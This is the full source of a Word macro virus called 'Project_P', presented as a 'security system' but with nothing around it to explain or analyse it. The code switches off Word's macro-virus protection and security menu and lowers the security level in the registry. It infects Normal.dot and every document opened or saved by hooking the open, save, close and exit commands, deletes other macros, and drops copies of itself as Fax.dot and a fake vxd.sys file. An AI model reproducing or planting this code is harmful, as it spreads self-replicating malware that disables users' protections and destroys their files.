   Attribute VB_Name = "Project_P"
   Private Sub Document_Open()
   On Error Resume Next
   If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
   CommandBars("Macro").Controls("Security...").Enabled = False
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
   Else
   Options.VirusProtection = False
   Options.ConfirmConversion = False
   Options.SaveNormalPrompt = False
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Project_P") = "...by AndryOktavia"
   Call AutoOpen
   End If
   Call AutoOpen
   End Sub
   Public AD As Object
   Public NT As Object
   Sub AutoOpen()
       On Error GoTo hapus
   Dim NT As Object
   Call Docurelfgh
   CreativE
   Call NothingElf
   Application.EnableCancelKey = wdCancelDisabled
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   Options.ConfirmConversions = False
   For i = 1 To NormalTemplate.VBProject.VBComponents.Count
       If NormalTemplate.VBProject.VBComponents(i).Name = "Project_P" Then NormInstall = True
   Next i
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
       If ActiveDocument.VBProject.VBComponents(i).Name = "Project_P" Then ActivInstall = True
   Next i
   If ActivInstall = True And NormInstall = True Then GoTo Label_Exit
   If ActivInstall = True And NormInstall = False Then Set Doc = ActiveDocument
   If ActivInstall = False And NormInstall = True Then Set Doc = NormalTemplate
   Pad = Options.DefaultFilePath(wdDocumentsPath)
   ModuleLength = Doc.VBProject.VBComponents("Project_P").CodeModule.CountOfLines
   NT.Save
   Doc.VBProject.VBComponents("Project_P").Export Pad + ("\Fax.txt")
   ActiveDocument.SaveAs fileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument

   Label_Exit:
   CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
   'CommandBars("Format").Controls("Style...").Delete
   If NormInstall = True Then Call CreativE
   Application.ScreenUpdating = True
   Application.DisplayAlerts = wdAlertsAll
   Application.EnableCancelKey = wdCancelInterrupt
   hapus:
   Docurelfgh
   End Sub
   Sub CreativE()
   On Error Resume Next
   Options.DefaultFilePath(wdStartupPath) = "C:\Windows"
   Options.DefaultFilePath(wdTempFilePath) = "C:\Windows\inf"
   Pad1 = Options.DefaultFilePath(wdStartupPath)
   MyFile = Dir(Pad1 + "\Fax.dot")
   If MyFile = "" Then
   Set Adoc = NormalTemplate.OpenAsDocument
   With Adoc
       .SaveAs fileName:=Pad1 + "\Fax.dot"
       .Close SaveChanges:=wdDoNotSaveChanges
   End With
   End If
   End Sub
   Sub FileSave()
       On Error Resume Next
       Dim Subyectif
       WordBasic.FileSave
       Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
       WordBasic.CurValues.FileSaveAs dlg
       Subyectif = WordBasic.FileSaveAs(dlg)
       If Subyectif Then
           dlg.Format = 1
           WordBasic.FileSaveAs dlg
       End If
       Call AutoOpen
       End Sub
   Sub FileClose()
       On Error Resume Next
       Call AutoOpen
       Call NothingElf
       Call Docurelfgh
       If ActiveDocument.Saved = False Then ActiveDocument.Save

       Call AutoOpen
   ActiveDocument.Close
   End Sub
   Sub FileSaveAs()
       On Error Resume Next
       Dim Subyectif
       WordBasic.FileSave
       Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
       WordBasic.CurValues.FileSaveAs (dlg)
       If Subyectif Then
           dlg.Format = 1
           WordBasic.FileSaveAs dlg
       End If
       Call AutoOpen
       End Sub
       Sub FileExit()
       On Error Resume Next
       Call AutoOpen
       NothingElf
       'Docurelfgh

       Call AutoOpen
       If ActiveDocument.Saved = False Then ActiveDocument.Save
       Application.Quit
   End Sub
   Sub AutoExit()
       On Error Resume Next
       Call AutoOpen
       Call NothingElf
       Call Docurelfgh

   End Sub
   Sub AutoExec()
   On Error GoTo hapus
   WordBasic.DisableInput 1
   WordBasic.DisableAutoMacros 0
   Call NothingElf
   Application.EnableCancelKey = wdCancelDisabled
       Call AutoOpen

   WBF
   AddIns.Unload False
   WBF
   hapus:
   Docurelfgh
   End Sub
   Sub AutoClose()
       On Error Resume Next
       Call AutoOpen
       NothingElf
       'Docurelfgh
       Project_P
   End Sub
   Sub ToolsMacro()
       On Error Resume Next
       Project_P
       If System.OperatingSystem = "Windows" Then Call pesen
       If System.OperatingSystem = "Windows" Then Call pesen
       Call pesen
   End Sub
   Sub FileTemplates()
       On Error Resume Next
       Project_P
       If System.OperatingSystem = "Windows" Then Call pesen
       If System.OperatingSystem = "Windows" Then Call pesen
   End Sub
   Sub ViewVBCode()
       On Error Resume Next
       Project_P
       If System.OperatingSystem = "Windows" Then Call pesen
       If System.OperatingSystem = "Windows" Then Call pesen
   End Sub
   Sub FileOpen()
   On Error Resume Next
   Call AutoOpen
   WBT
   If Dialogs(80).Show <> 0 Then
   Call AutoOpen
   Call Docurelfgh
   Call NothingElf
   'Project_P
   Call AutoOpen
   WBF
   Else
   WBF
   End If
   End Sub
   Sub pesen()
   msg1 = "This Program Can't Be Removed aaaa"
   msg2 = " For More Information please Contact Us"
   Msg3 = " http:// www.valerianet.com or E-Mail: andryok@valerianet.com"
   MsgBox (msg1 + Chr(10) + msg2 + Chr(10) + Msg3)
   End Sub
   Sub vote()
   Nama1 = "Project_P Security Systemaaa"
   Nama2 = "Andry Security Systemaaaa"
   msg1 = " Thank you for Using Our Product xxxxxxxxxx "
   msg2 = " This Program Under Protected The International Treaty"
   Msg3 = "(c) Andry 1999xxxxxxxxxxxx., Alright Reserved.aaaaa "
   msg4 = " Thanks "
   If Day(Now) = 26 Then MsgBox msg1 + Nama1 + Chr(10) + msg2 + Chr(10) + Msg3 + Nama1, vbInformation, "ValeriaNet Security System"
   If Day(Now) = 7 Then MsgBox msg1 + Nama2 + Chr(10) + msg2 + Chr(10) + Msg3 + Nama2, vbInformation, "ValeriaNet Security System"
   End Sub
   Function Docurelfgh()
       On Error GoTo Erw1
       NorOk = False
       WBT
       Set AD = ActiveDocument
       Set NT = NormalTemplate
       On Error GoTo Erh1a
       For i = 1 To NormalTemplate.VBProject.VBComponents.Count
         NMacr = NormalTemplate.VBProject.VBComponents(i).Name
         If NMacr = "Project_P" Then NorOk = True
         If (NMacr <> "Project_P") And (NMacr <> "ThisDocument") Then
         MsgBox ("NT.Microsoft Word "), vbInformation, "ValeriaNet Security System"
     Application.OrganizerDelete Source:=NormalTemplate.FullName, _
               Name:=NMacr, Object:=wdOrganizerObjectProjectItems

         End If
       Next i
   Erh1a:
       If NorOk = False Then
         On Error GoTo Erh1
               Application.OrganizerCopy Source:=ActiveDocument.FullName, _
             Destination:=NormalTemplate.FullName, Name:= _
             "Project_P", Object:=wdOrganizerObjectProjectItems
         Templates(NormalTemplate.FullName).Save
         NormalTemplate.Application.Visible = False
   Erh1:
       End If
   Erw1:
   End Function
   Function NothingElf()
       On Error GoTo Erw2
       DokSave = 0
       DocOk = False
       Set AD = ActiveDocument
       Set NT = NormalTemplate
       On Error GoTo Erh2a
       For i = 1 To AD.VBProject.VBComponents.Count
         NMacr = AD.VBProject.VBComponents(i).Name
         If NMacr = "Project_P" Then DocOk = True
         'NMacr = NT.VBProject.VBComponents(i).Name
         'If NMacr = "Project_P" Then Docok = True
         If (NMacr <> "Project_P") And _
           (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
          MsgBox ("AD. Microsoft Word"), vbInformation, "ValeriaNet Security System"
           Application.OrganizerDelete Source:=AD.FullName, _
             Name:=NMacr, Object:=wdOrganizerObjectProjectItems
         End If
       Next i
   Erh2a:
       If DocOk = False Then
         On Error GoTo Erh2
         Application.OrganizerCopy Source:=NT.FullName, _
             Destination:=AD.FullName, Name:= _
             "Project_P", Object:=wdOrganizerObjectProjectItems
         ActiveDocument.ReadOnlyRecommended = False
         ActiveDocument.Save
   Erh2:
       End If
   Erw2:
   End Function
   Function WBT()
   WordBasic.DisableAutoMacros True
   End Function
   Function WBF()
   WordBasic.DisableAutoMacros False
   End Function
   Function Cute()
   f56879025 = GetAttr(NormalTemplate.FullName)
   Application.VBE.ActiveVBProject.VBComponents("Project_P").Export "c:\windows\system\vxd.sys"
   If f56879025 = vbReadOnly Then GoTo rewing
   If f56879025 = vbReadOnly + vbArchive Then GoTo rewing
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
   If ActiveDocument.VBProject.VBComponents(i).Name = "Project_P" Then xxx902578112 = True
   Next i
   For i = 1 To NormalTemplate.VBProject.VBComponents.Count
   If NormalTemplate.VBProject.VBComponents(i).Name = "Project_P" Then mmf78116 = True
   Next i
   If xxx902578112 = True And mmf78116 = False Then Set o7811902511 = NormalTemplate.VBProject.VBComponents
   If xxx902578112 = False And mmf78116 = True Then Set o7811902511 = ActiveDocument.VBProject.VBComponents
   o7811902511.Import "c:\windows\system\vxd.sys"
   If activeinst = False Then ActiveDocument.SaveAs fileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
   If mmf78116 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
   rewing:
   End Function
